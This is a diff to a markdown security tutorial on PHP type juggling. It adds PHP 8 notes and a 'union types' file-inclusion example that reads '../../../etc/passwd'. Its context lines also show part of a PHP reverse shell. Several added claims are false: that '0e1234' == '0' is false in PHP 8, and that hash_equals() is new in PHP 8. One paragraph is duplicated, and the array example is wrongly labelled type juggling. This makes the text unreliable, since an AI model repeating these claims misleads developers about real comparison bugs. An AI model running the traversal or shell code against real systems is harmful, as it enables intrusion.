@@ -41,6 +41,8 @@ In this section we will discuss **PHP type juggling** and how this can lead to a
 
 ![Type Juggling examples](./assets/type-juggling.png)
 
+PHP 8 introduces more consistent comparison behavior by making improvements to how strings and numbers are compared. The changes mainly affect how PHP treats numbers in scientific notation when using loose comparisons. Now, "0e1234" == "0" evaluates to false in PHP 8 because each string is treated as a distinct entity rather than automatically converting to a number.
+
 ## How PHP compares values
 
 PHP has a feature called "type juggling" or "type coercion".
@@ -89,6 +91,8 @@ The following tables showcase the difference between the two comparison modes:
 | Loose comparison    | Strict comparison   |
 | ------------------- | ------------------- |
 | ![Loose comparison](./assets/loose-comparison.png) | ![Strict comparison](./assets/strict-comparison.png) |
+
+PHP 8 continues to encourage the use of strict comparisons (=== and !==) to avoid the pitfalls of type juggling. Using strict comparisons helps prevent unintended behavior that can arise from loose comparison. This version continues to encourage the use of strict comparisons (=== and !==) to avoid the pitfalls of type juggling. Using strict comparisons helps prevent unintended behavior that can arise from loose comparison.
 
 However, loose type comparison behavior like the one presented above is pretty common in PHP and many built-in functions work in the same way.
 You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?
@@ -222,6 +226,8 @@ Below is a table of such hashes discovered so far:
 
 Even though you won't find such examples on a daily basis, it's important to know that there is such a possibility and beware of using loose comparison.
 It's just another example of how dangerous it is.
+
+PHP 8 introduces the `hash_equals()` function for secure hash comparisons. It compares two strings in constant time to prevent timing attacks, ensuring safer hash verification.
 
 ## Bypassing `strcmp()` function
 
@@ -454,6 +460,33 @@ In order to get root access on the machine, further **privilege escalation** met
     $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
 ?>
 ```
+
+### Type Juggling with Union Types
+
+PHP 8 introduced union types, which allow a variable to be one of multiple specified types. However, improper validation of these types can lead to vulnerabilities, such as type juggling, which attackers can exploit to perform LFI or RFI attacks.
+
+Example: Consider a function that processes file paths using union types. If the file paths aren't strictly validated, an attacker might manipulate them to include unintended files:
+
+```php
+<?php
+// Potentially vulnerable function accepting union types
+function openFile(string|array $filePath) {
+    if (is_string($filePath)) {
+        include $filePath; // Dangerous if $filePath is controlled by an attacker
+    } elseif (is_array($filePath)) {
+        foreach ($filePath as $file) {
+            include $file; // Each element should be validated
+        }
+    }
+}
+
+// Exploit
+$filePath = ["../../../etc/passwd"]; // Type juggling might lead to unintended inclusion
+openFile($filePath);
+```
+
+In this example, an attacker could exploit type juggling by passing an array as an argument, which might lead to unintended file inclusions if each file path is not properly validated.
+
 # Python Insecure Deserialization / `pickle` module
 
 We have looked at so many PHP vulnerabilities in this session, but you shouldn't be left with the impression that PHP is the only vulnerable language.
